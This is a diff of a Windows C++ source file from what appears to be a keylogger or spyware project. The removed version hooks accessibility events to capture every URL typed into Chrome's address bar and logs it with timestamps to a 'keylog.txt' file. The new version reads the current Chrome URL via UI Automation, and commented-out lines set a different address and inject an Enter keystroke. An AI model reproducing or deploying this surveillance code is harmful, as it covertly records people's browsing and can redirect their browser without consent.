@@ -1,59 +1,73 @@
 #include "url.h"
-#include "../keyboard/keyboard.h"
-#include <fstream>
 
-HWINEVENTHOOK LHook = 0;
 
-void flushUrl(std::string url) {
-    std::ofstream myfile("../keylog.txt", std::ios::out | std::ios::app);
-    if (myfile.is_open())
+bool find_url(IUIAutomation *uia, IUIAutomationElement *root, std::string &retUrl)
+{
+    // The root window has several childs,
+    // one of them is a "pane" named "Google Chrome"
+    // This contains the toolbar. Find this "Google Chrome" pane:
+    CComPtr<IUIAutomationElement> pane;
+    CComPtr<IUIAutomationCondition> pane_cond;
+    uia->CreatePropertyCondition(UIA_ControlTypePropertyId,
+                                 CComVariant(UIA_PaneControlTypeId), &pane_cond);
+
+    CComPtr<IUIAutomationElementArray> arr;
+    if FAILED (root->FindAll(TreeScope_Children, pane_cond, &arr))
+        return false;
+
+    int count = 0;
+    arr->get_Length(&count);
+    for (int i = 0; i < count; i++)
     {
-        std::time_t logTime = system_clock::to_time_t(system_clock::now());
-        myfile << std::ctime(&logTime) << "> " << url << '\n';
-    }
-    myfile.flush();
-    myfile.close();
-}
-
-
-
-void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime) {
-    IAccessible* pAcc = NULL;
-    VARIANT varChild;
-    if ((AccessibleObjectFromEvent(hwnd, idObject, idChild, &pAcc, &varChild) == S_OK) && (pAcc != NULL)) {
-        char className[50];
-        if (GetClassName(hwnd, className, 50) && strcmp(className, "Chrome_WidgetWin_1") == 0) {
-            BSTR bstrName = nullptr;
-            if (pAcc->get_accName(varChild, &bstrName) == S_OK) {
-                if (wcscmp(bstrName, L"Адресная строка и строка поиска") == 0) {
-                    BSTR bstrValue = nullptr;
-                    if (pAcc->get_accValue(varChild, &bstrValue) == S_OK) {
-                        // printf("URL change: %ls\n", bstrValue);
-                        std::wstring wideString(bstrValue);
-                        std::string narrowString(wideString.length(), 0);
-                        WideCharToMultiByte(CP_UTF8, 0, wideString.c_str(), -1, &narrowString[0], narrowString.size(), NULL, NULL);
-
-                        if (narrowString.length() > 0)
-                            flushUrl(narrowString);
-                        SysFreeString(bstrValue);
-                    }
-                }
-                SysFreeString(bstrName);
+        CComBSTR name;
+        if SUCCEEDED (arr->GetElement(i, &pane))
+            if SUCCEEDED (pane->get_CurrentName(&name))
+            {
+                std::wstring ws(name, SysStringLen(name));
+                if (ws.find(L"Google Chrome") != std::wstring::npos)
+                    break;
+                // if (wcscmp(name, L"Google Chrome") == 0)
+                //     break;
             }
-            pAcc->Release();
-        }
+            
+                
+        pane.Release();
     }
-}
 
+    if (!pane)
+        return false;
 
-void hookUrl() {
-    if (LHook != 0) return;
-    CoInitialize(NULL);
-    LHook = SetWinEventHook(EVENT_OBJECT_FOCUS, EVENT_OBJECT_VALUECHANGE, 0, WinEventProc, 0, 0, WINEVENT_SKIPOWNPROCESS);
-}
+    // look for first UIA_EditControlTypeId under "Google Chrome" pane
+    CComPtr<IUIAutomationElement> url;
+    CComPtr<IUIAutomationCondition> url_cond;
+    uia->CreatePropertyCondition(UIA_ControlTypePropertyId,
+                                 CComVariant(UIA_EditControlTypeId), &url_cond);
+    if FAILED (pane->FindFirst(TreeScope_Descendants, url_cond, &url))
+        return false;
 
-void unhookUrl() {
-    if (LHook == 0) return;
-    UnhookWinEvent(LHook);
-    CoUninitialize();
+    // get value of `url`
+    CComVariant var;
+    if FAILED (url->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &var))
+        return false;
+    if (!var.bstrVal)
+        return false;
+    // wprintf(L"find_url: %s\n", var.bstrVal);
+
+    std::wstring wStr(var.bstrVal, SysStringLen(var.bstrVal));
+    retUrl = std::string(wStr.begin(), wStr.end());
+
+    // set new address ...
+    // IValueProvider *pattern = nullptr;
+    // if (FAILED(url->GetCurrentPattern(UIA_ValuePatternId, (IUnknown **)&pattern)))
+    //     return false;
+    // // pattern->SetValue(L"somewhere.com");
+    // pattern->Release();
+
+    // INPUT input[2] = {INPUT_KEYBOARD};
+    // input[0].ki.wVk = VK_RETURN;
+    // input[1] = input[0];
+    // input[1].ki.dwFlags |= KEYEVENTF_KEYUP;
+    // SendInput(2, input, sizeof(INPUT));
+
+    return true;
 }
